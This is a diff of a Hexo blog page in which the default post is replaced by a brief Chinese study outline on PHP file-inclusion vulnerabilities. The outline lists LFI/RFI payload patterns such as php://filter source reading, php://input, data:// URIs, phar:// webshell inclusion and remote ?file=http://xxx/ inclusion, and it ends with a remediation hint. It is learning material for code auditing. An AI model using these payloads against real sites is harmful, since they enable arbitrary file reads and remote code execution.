@@ -15,17 +15,18 @@
 
 
 
-<meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troublesho">
+<meta name="description" content="文件包含漏洞学习笔记">
+<meta name="keywords" content="Summary,代码审计,PHP,PHP文件包含漏洞">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="http://akkayin.github.io/2017/11/19/hello-world/index.html">
+<meta property="og:title" content="php文件包含漏洞Summary">
+<meta property="og:url" content="http://akkayin.github.io/2017/12/17/php文件包含漏洞/index.html">
 <meta property="og:site_name" content="KarmA&#39;s Blog">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta property="og:description" content="文件包含漏洞学习笔记">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-11-19T00:10:18.005Z">
+<meta property="og:updated_time" content="2017-12-17T03:36:09.146Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hello World">
-<meta name="twitter:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta name="twitter:title" content="php文件包含漏洞Summary">
+<meta name="twitter:description" content="文件包含漏洞学习笔记">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -57,7 +58,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>Hello World | KarmA&#39;s Blog</title>
+<title>php文件包含漏洞Summary | KarmA&#39;s Blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -263,11 +264,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-php文件包含漏洞" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2017/11/19/hello-world/" class="article-date">
-      <time datetime="2017-11-19T00:10:18.004Z" itemprop="datePublished">2017-11-19</time>
+      <a href="/2017/12/17/php文件包含漏洞/" class="article-date">
+      <time datetime="2017-12-17T02:15:03.000Z" itemprop="datePublished">2017-12-17</time>
 </a>
 
 
@@ -282,7 +283,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      Hello World
+      php文件包含漏洞Summary
     </h1>
   
 
@@ -290,8 +291,16 @@
       
       <div class="article-info article-info-post">
         
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/Study/">Study</a>
+    </div>
+
 
         
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP文件包含漏洞/">PHP文件包含漏洞</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Summary/">Summary</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
+    </div>
+
         <div class="clearfix"></div>
       </div>
       
@@ -299,16 +308,28 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+        <excerpt in="" index="" |="" 首页摘要="">
 
+<p>文件包含漏洞学习笔记<a id="more"></a></p>
+<the rest="" of="" contents="" |="" 余下全文="">
+
+
+
+<p>相关函数：</p>
+<p>include($file)</p>
+<p>include($path.$filename.$ext)</p>
+<h2 id="本地包含LFI"><a href="#本地包含LFI" class="headerlink" title="本地包含LFI"></a>本地包含LFI</h2><h3 id="限制后缀-php"><a href="#限制后缀-php" class="headerlink" title="限制后缀 *.php"></a>限制后缀 *.php</h3><h4 id="伪协议-zip-amp-phba"><a href="#伪协议-zip-amp-phba" class="headerlink" title="伪协议 zip:// &amp;phba//"></a>伪协议 zip:// &amp;phba//</h4><p>限制路径（$path），不能用伪协议和远程文件包含</p>
+<p>限制路径，不限制后缀，可包含日志&amp;环境变量&amp;session文件&amp;临时文件</p>
+<p>路径后缀都限制–&gt;无法利用</p>
+<p>审计思路：根据include()的内容，判断包含的后缀名–&gt;判断上传的后缀名，构造一句话木马–&gt;运用伪协议(phar://path/file/xx.inc)–&gt;寻找php处理上传文件的方式，以及利用方式（全局搜索：$_FILES）–&gt;构造payload–&gt;测试是否已经包含一句话木马脚本–&gt;如何修复（定义一个数组，判断传递的数据是否存在于已设定的数组里或者限定路径和后缀php则不能用协议去读取任意文件）</p>
+<blockquote>
+<p>把时间信息（firebug抓包获得）转换为时间戳，推断文件名</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="meta">&lt;?php</span></span><br><span class="line">&gt;data_default_timezone_set(<span class="string">'UTC'</span>);</span><br><span class="line">&gt;<span class="keyword">echo</span> strtotime(<span class="string">''</span>);</span><br><span class="line">&gt;<span class="meta">?&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><a href="http://blog.csdn.net/u010726042/article/details/75041367" target="_blank" rel="noopener">php文件包含+伪协议+文件上传漏洞利用实例</a></p>
+<p><a href="http://blog.csdn.net/Ni9htMar3/article/details/69812306?locationNum=2&amp;fps=1" target="_blank" rel="noopener">php 伪协议</a></p>
+<h4 id="截断大法"><a href="#截断大法" class="headerlink" title="截断大法"></a>截断大法</h4><p>（php更新之后已修复）</p>
+<h3 id="日志-amp-环境变量"><a href="#日志-amp-环境变量" class="headerlink" title="日志&amp;环境变量"></a>日志&amp;环境变量</h3><h3 id="session文件"><a href="#session文件" class="headerlink" title="session文件"></a>session文件</h3><h3 id="结合phpinfo-包含临时文件"><a href="#结合phpinfo-包含临时文件" class="headerlink" title="结合phpinfo 包含临时文件"></a>结合phpinfo 包含临时文件</h3><h3 id="无后缀限制，包含任意文件"><a href="#无后缀限制，包含任意文件" class="headerlink" title="无后缀限制，包含任意文件"></a>无后缀限制，包含任意文件</h3><h3 id="读取任意文件，-file-php-filter-convert-base64-encode-resource-index-php"><a href="#读取任意文件，-file-php-filter-convert-base64-encode-resource-index-php" class="headerlink" title="读取任意文件，?file=php://filter/convert base64 encode/resource=index.php"></a>读取任意文件，?file=php://filter/convert base64 encode/resource=index.php</h3><h2 id="远程包含RFI-（默认off）"><a href="#远程包含RFI-（默认off）" class="headerlink" title="远程包含RFI （默认off）"></a>远程包含RFI （默认off）</h2><h3 id="allow-url-include-amp-amp-allow-url-fopen-Off"><a href="#allow-url-include-amp-amp-allow-url-fopen-Off" class="headerlink" title="allow_url_include &amp;&amp; allow_url_fopen= Off"></a>allow_url_include &amp;&amp; allow_url_fopen= Off</h3><h4 id="代码执行，-file-php-input"><a href="#代码执行，-file-php-input" class="headerlink" title="代码执行，?file=php://input"></a>代码执行，?file=php://input</h4><h4 id="利用tata-URIs，-file-data-text-plain-base64-SSBsb3ZIIFBIUAo"><a href="#利用tata-URIs，-file-data-text-plain-base64-SSBsb3ZIIFBIUAo" class="headerlink" title="利用tata URIs，?file=data://text/plain,base64,SSBsb3ZIIFBIUAo="></a>利用tata URIs，?file=data://text/plain,base64,SSBsb3ZIIFBIUAo=</h4><h3 id="allow-url-fopen-On"><a href="#allow-url-fopen-On" class="headerlink" title="allow_url_fopen = On"></a>allow_url_fopen = On</h3><h4 id="远程代码执行-file-http-https-ftp-xxx-file"><a href="#远程代码执行-file-http-https-ftp-xxx-file" class="headerlink" title="远程代码执行 ?file=[http|https|ftp]://xxx/file"></a>远程代码执行 ?file=[http|https|ftp]://xxx/file</h4><h4 id="利用XSS执行任意代码-file-http-xxx-xss-php-css-phpcode"><a href="#利用XSS执行任意代码-file-http-xxx-xss-php-css-phpcode" class="headerlink" title="利用XSS执行任意代码 ?file=http://xxx/xss.php?css=phpcode"></a>利用XSS执行任意代码 ?file=<a href="http://xxx/xss.php?css=phpcode" target="_blank" rel="noopener">http://xxx/xss.php?css=phpcode</a></h4><h4 id="远程代码执行-file-http-https-ftp-xxx-file-txt-23"><a href="#远程代码执行-file-http-https-ftp-xxx-file-txt-23" class="headerlink" title="远程代码执行 ?file=[http|https|ftp]://xxx/file.txt[?|%23]"></a>远程代码执行 ?file=[http|https|ftp]://xxx/file.txt[?|%23]</h4></the></excerpt>
       
     </div>
     
@@ -316,13 +337,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/11/19/hello-world/">Hello World</a></p>
+        <p><span>本文标题:</span><a href="/2017/12/17/php文件包含漏洞/">php文件包含漏洞Summary</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">KarmA</a></p>
-        <p><span>发布时间:</span>2017-11-19, 08:10:18</p>
-        <p><span>最后更新:</span>2017-11-19, 08:10:18</p>
+        <p><span>发布时间:</span>2017-12-17, 10:15:03</p>
+        <p><span>最后更新:</span>2017-12-17, 11:36:09</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/11/19/hello-world/" title="Hello World">http://akkayin.github.io/2017/11/19/hello-world/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://akkayin.github.io/2017/11/19/hello-world/　　作者: KarmA" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/12/17/php文件包含漏洞/" title="php文件包含漏洞Summary">http://akkayin.github.io/2017/12/17/php文件包含漏洞/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://akkayin.github.io/2017/12/17/php文件包含漏洞/　　作者: KarmA" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -335,11 +356,17 @@
     <nav id="article-nav">
         
             <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2017/11/19/论Mac备份的重要性<-血的教训md/">
-                    论Mac备份的重要性&lt;-血的教训
+                <a href="/2017/12/18/php文件操作漏洞/">
+                    php文件操作漏洞
                 </a>
             </div>
         
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2017/12/16/authenticwords/">
+                    Authentic Words Summary
+                </a>
+            </div>
         
     </nav>
 
@@ -349,7 +376,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Start"><span class="toc-text">Quick Start</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Create-a-new-post"><span class="toc-text">Create a new post</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Run-server"><span class="toc-text">Run server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Generate-static-files"><span class="toc-text">Generate static files</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Deploy-to-remote-sites"><span class="toc-text">Deploy to remote sites</span></a></li></ol></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#本地包含LFI"><span class="toc-text">本地包含LFI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#限制后缀-php"><span class="toc-text">限制后缀 *.php</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#伪协议-zip-amp-phba"><span class="toc-text">伪协议 zip:// &phba//</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#截断大法"><span class="toc-text">截断大法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#日志-amp-环境变量"><span class="toc-text">日志&环境变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session文件"><span class="toc-text">session文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#结合phpinfo-包含临时文件"><span class="toc-text">结合phpinfo 包含临时文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#无后缀限制，包含任意文件"><span class="toc-text">无后缀限制，包含任意文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#读取任意文件，-file-php-filter-convert-base64-encode-resource-index-php"><span class="toc-text">读取任意文件，?file=php://filter/convert base64 encode/resource=index.php</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#远程包含RFI-（默认off）"><span class="toc-text">远程包含RFI （默认off）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#allow-url-include-amp-amp-allow-url-fopen-Off"><span class="toc-text">allow_url_include && allow_url_fopen= Off</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#代码执行，-file-php-input"><span class="toc-text">代码执行，?file=php://input</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用tata-URIs，-file-data-text-plain-base64-SSBsb3ZIIFBIUAo"><span class="toc-text">利用tata URIs，?file=data://text/plain,base64,SSBsb3ZIIFBIUAo=</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#allow-url-fopen-On"><span class="toc-text">allow_url_fopen = On</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#远程代码执行-file-http-https-ftp-xxx-file"><span class="toc-text">远程代码执行 ?file=[http|https|ftp]://xxx/file</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用XSS执行任意代码-file-http-xxx-xss-php-css-phpcode"><span class="toc-text">利用XSS执行任意代码 ?file=http://xxx/xss.php?css=phpcode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#远程代码执行-file-http-https-ftp-xxx-file-txt-23"><span class="toc-text">远程代码执行 ?file=[http|https|ftp]://xxx/file.txt[?|%23]</span></a></li></ol></li></ol></li></ol>
         
     </div>
     <style>
@@ -385,7 +412,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"Hello World　| KarmA's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"php文件包含漏洞Summary　| KarmA's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -419,7 +446,7 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/11/19/论Mac备份的重要性<-血的教训md/" title="上一篇: 论Mac备份的重要性&lt;-血的教训">
+            <a href="/2017/12/18/php文件操作漏洞/" title="上一篇: php文件操作漏洞">
                 <i class="fa fa-angle-left"></i>
             </a>
         
@@ -427,7 +454,9 @@
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+            <a href="/2017/12/16/authenticwords/" title="下一篇: Authentic Words Summary">
+                <i class="fa fa-angle-right"></i>
+            </a>
         
     </div>
 
